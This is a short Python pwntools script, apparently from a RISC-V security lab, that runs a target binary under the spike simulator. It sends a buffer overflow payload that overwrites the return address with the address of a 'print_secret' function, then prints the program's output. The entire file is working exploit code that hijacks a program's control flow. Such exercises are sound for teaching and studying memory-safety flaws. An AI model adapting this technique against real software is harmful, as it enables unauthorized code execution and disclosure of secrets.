#!/usr/bin/env python

from pwn import *
import sys

if(len(sys.argv) < 2):
    print('usage: python3 bof-ex.py <bin name>')
if(len(sys.argv) == 4):
    spike = sys.argv[2]
    pk = sys.argv[3]
else:
    spike = 'build/riscv-isa-sim/spike'
    pk = 'build/riscv-pk/pk'
bin_name = sys.argv[1]
cmd = ' '.join([spike, pk, bin_name])
p = process(argv=cmd.split())
e = ELF(bin_name)
get_a_shell = e.symbols['print_secret']


buf = bytes("1"*120 + "ABCDEFGH" + "BBBBCCCC", 'utf-8') + p64(get_a_shell)
#print(buf)
out = p.recv().decode('utf-8')
print(out)
p.sendline(buf)
out = ''
while True:
    try:
      out += p.recv().decode('utf-8')
    except EOFError:
      print(out)
      break
